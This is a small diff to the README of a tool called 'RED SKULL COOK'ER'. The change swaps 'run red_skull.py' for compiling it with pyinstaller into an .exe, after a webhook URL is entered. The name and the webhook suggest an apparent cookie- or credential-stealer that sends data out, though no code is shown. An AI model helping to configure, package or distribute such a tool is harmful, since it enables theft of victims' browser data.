@@ -10,6 +10,7 @@ RED SKULL COOK'ER
 ### 〢 Setting Up
 
 1. Put ur webhook at WebHook = ""
-2. Run red_skull.py
+2. Compile it with pyinstaller
+3. Run red_skull.exe
 
 made by Noescape#2456
